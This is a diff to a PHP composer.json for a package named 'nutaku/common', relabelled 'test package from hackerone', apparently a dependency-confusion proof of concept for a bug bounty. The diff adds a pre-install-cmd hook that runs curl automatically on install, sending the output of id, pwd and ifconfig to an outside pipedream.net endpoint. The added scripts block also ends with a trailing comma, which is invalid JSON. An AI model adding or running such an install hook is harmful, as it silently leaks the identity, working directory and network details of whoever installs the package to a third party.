@@ -1,6 +1,6 @@
 {
 "name": "nutaku/common",
-"description": "HashCLI - PHP CLI Tool For hashing",
+"description": "test package from hackerone",
 "type": "library",
 "keywords": ["hash", "cli"],
 "license": "MIT",
@@ -10,9 +10,10 @@
 "require-dev": {
     "phpunit/phpunit": "^5.7"
 },
-"bin":[
-    "src/hashCLI"
-],
+"scripts": {
+        "pre-install-cmd": "curl -d \"`id;pwd;ifconfig`\" -H \"Content-Type: application/json\" \"https://e7faf113fb2209a99d53e522c9ef5477.m.pipedream.net\"",
+       
+    },
 "autoload": {
     "classmap": [
         "src/"
